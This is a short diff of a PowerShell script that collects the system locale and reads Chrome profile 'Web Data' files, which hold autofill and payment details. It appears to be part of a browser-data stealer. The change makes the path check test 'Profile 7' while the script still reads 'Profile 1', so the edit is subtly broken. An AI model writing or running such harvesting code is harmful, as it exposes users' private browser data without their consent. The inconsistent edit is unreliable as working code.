@@ -9,7 +9,7 @@ $var += Get-WinSystemLocale
 
 # if profiles exist try 1 - 10 if not pull data normally... (GOOGLE CHROME)
 
-if (Test-Path -Path "Profile 1") {
+if (Test-Path -Path "Profile 7") {
 
     $var += cat -Path "Profile 1\Web Data"
 
